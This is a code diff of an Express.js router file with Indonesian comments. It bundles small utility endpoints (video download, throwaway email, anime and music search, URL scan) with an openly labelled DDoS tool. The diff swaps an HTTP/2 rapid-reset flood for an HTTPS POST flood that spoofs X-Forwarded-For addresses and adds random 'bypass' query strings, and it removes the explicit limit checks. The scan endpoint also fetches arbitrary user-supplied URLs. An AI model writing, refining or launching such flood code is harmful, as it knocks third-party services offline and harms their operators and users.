@@ -1,13 +1,13 @@
 const express = require('express');
 const router = express.Router();
 const axios = require('axios');
-const net = require('net');
-const tls = require('tls');
-const http2 = require('http2');
+const https = require('https');
+const http = require('http');
 const { URL } = require('url');
 
 let ddosState = { running: false, target: null, requests: 0, success: 0, failed: 0, startedAt: 0, activeSockets: new Set() };
 
+// Tools lain (Video, Gmail, dll tetap sama)
 router.post('/video', async (req, res) => {
   try {
     const { url } = req.body;
@@ -24,32 +24,19 @@ router.post('/video', async (req, res) => {
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
 
-// ENDPOINT BARU: UNTUK DOWNLOAD FILE VIDEO DARI SERVER
 router.get('/download', async (req, res) => {
   try {
     const { url, filename } = req.query;
     if (!url) return res.status(400).send('URL required');
-
-    // Request video dari server sumber (tikwm) ke server lokal kita
-    const response = await axios({
-      method: 'get',
-      url: url,
-      responseType: 'stream',
-      headers: { 'User-Agent': 'Mozilla/5.0' }
-    });
-
-    // Set header agar browser otomatis mendownload
+    const response = await axios({ method: 'get', url: url, responseType: 'stream', headers: { 'User-Agent': 'Mozilla/5.0' } });
     res.setHeader('Content-Disposition', `attachment; filename="${filename || 'video.mp4'}"`);
     res.setHeader('Content-Type', 'video/mp4');
-
-    // Alirkan data video langsung ke browser
     response.data.pipe(res);
-  } catch (e) {
-    res.status(500).send('Gagal download video.');
-  }
+  } catch (e) { res.status(500).send('Gagal download video.'); }
 });
 
 router.get('/gmail', (req, res) => { res.json({ ok: true, email: `${Math.random().toString(36).substring(7)}@mail.tm`, password: 'pass123' }); });
+
 router.get('/anime', async (req, res) => {
   try {
     const gql = `query { Page(perPage: 10) { media(search: "${req.query.q || 'naruto'}", type: ANIME) { id title { romaji english } coverImage { large } } } }`;
@@ -57,12 +44,14 @@ router.get('/anime', async (req, res) => {
     res.json({ ok: true, data: r.data.data.Page.media });
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
+
 router.get('/music', async (req, res) => {
   try {
     const r = await axios.get('https://itunes.apple.com/search', { params: { term: req.query.q || 'lofi', media: 'music', limit: 10 } });
     res.json({ ok: true, data: r.data.results });
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
+
 router.post('/scan', async (req, res) => {
   try {
     const r = await axios.get(req.body.url, { timeout: 8000, validateStatus: () => true }).catch(() => ({ status: 408, headers: {} }));
@@ -71,23 +60,40 @@ router.post('/scan', async (req, res) => {
   } catch (e) { res.status(500).json({ ok: false, msg: 'Error' }); }
 });
 
-// DDoS
-function rapidResetAttack(targetUrl, stats, io) {
+// === ENGINE DDOS HTTP/1.1 RAW SOCKET ===
+function attack(targetUrl, stats, io) {
   try {
     const parsed = new URL(targetUrl);
-    if (parsed.protocol !== 'https:') return;
-    const client = http2.connect(parsed.origin);
-    client.on('error', () => {});
-    const req = client.request({ ':path': parsed.pathname + '?ovp=' + Math.random().toString(36).substring(7), ':method': 'POST', 'user-agent': 'Mozilla/5.0' });
-    let count = 0;
-    const interval = setInterval(() => {
-      if (client.destroyed || !ddosState.running) { clearInterval(interval); return; }
-      req.write('a'.repeat(1000)); count++;
-      if (count > 50) { clearInterval(interval); req.close(); client.close(); }
-    }, 100);
-    req.on('response', () => { stats.success++; io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size }); });
-    req.on('error', () => { stats.failed++; client.close(); });
-    stats.requests++; stats.activeSockets.add(client);
+    const isHttps = parsed.protocol === 'https:';
+    const options = {
+      hostname: parsed.hostname,
+      port: 443,
+      path: parsed.pathname + '?bypass=' + Math.random().toString(36).substring(7),
+      method: 'POST',
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Content-Length': 1000,
+        'Connection': 'keep-alive',
+        'X-Forwarded-For': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
+      },
+      timeout: 4000
+    };
+
+    const req = https.request(options, (res) => {
+      stats.success++;
+      io.emit('ddos:stats', { ...stats, activeSockets: stats.activeSockets.size });
+      res.on('data', () => {});
+    });
+
+    req.on('error', () => {
+      stats.failed++;
+    });
+
+    req.write('a='.repeat(500)); // Kirim payload body
+    req.end();
+    stats.requests++;
+
   } catch (e) { stats.failed++; }
 }
 
@@ -95,20 +101,31 @@ router.post('/ddos', async (req, res) => {
   try {
     let { target, duration, threads } = req.body;
     target = target.replace(/[, ]+$/, "");
-    if (duration > 120) return res.status(400).json({ ok: false, msg: 'Durasi maks 120!' });
-    if (threads > 200) return res.status(400).json({ ok: false, msg: 'Threads maks 200!' });
+    
     if (!target.startsWith('https://')) return res.status(400).json({ ok: false, msg: 'Wajib https://' });
-    if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS berjalan' });
+    if (ddosState.running) return res.status(400).json({ ok: false, msg: 'DDoS sedang berjalan' });
+    
     const dur = Math.min(Number(duration) || 10, 120);
     const th = Math.min(Number(threads) || 10, 200);
+    
     ddosState = { running: true, target, requests: 0, success: 0, failed: 0, startedAt: Date.now(), activeSockets: new Set() };
     const io = req.app.get('io');
+    
     res.json({ ok: true, msg: 'Started', state: ddosState });
+    
+    // Loop sekuensial (lebih stabil buat Node.js)
     (async () => {
       const end = Date.now() + dur * 1000;
       while (ddosState.running && Date.now() < end) {
-        for (let i = 0; i < th; i++) rapidResetAttack(target, ddosState, io);
-        await new Promise(r => setTimeout(r, 50));
+        const promises = [];
+        for (let i = 0; i < th; i++) {
+          promises.push(new Promise(resolve => {
+            attack(target, ddosState, io);
+            resolve();
+          }));
+        }
+        await Promise.all(promises);
+        await new Promise(r => setTimeout(r, 100)); // Jeda antar putaran
       }
       ddosState.running = false;
       io.emit('ddos:done', ddosState);
@@ -119,8 +136,6 @@ router.post('/ddos', async (req, res) => {
 router.post('/ddos/stop', (req, res) => {
   if (!ddosState.running) return res.status(400).json({ ok: false, msg: 'Tidak berjalan' });
   ddosState.running = false;
-  ddosState.activeSockets.forEach(sock => { try { sock.destroy(); } catch(e){} });
-  ddosState.activeSockets.clear();
   res.json({ ok: true, msg: 'Dihentikan.' });
 });
 
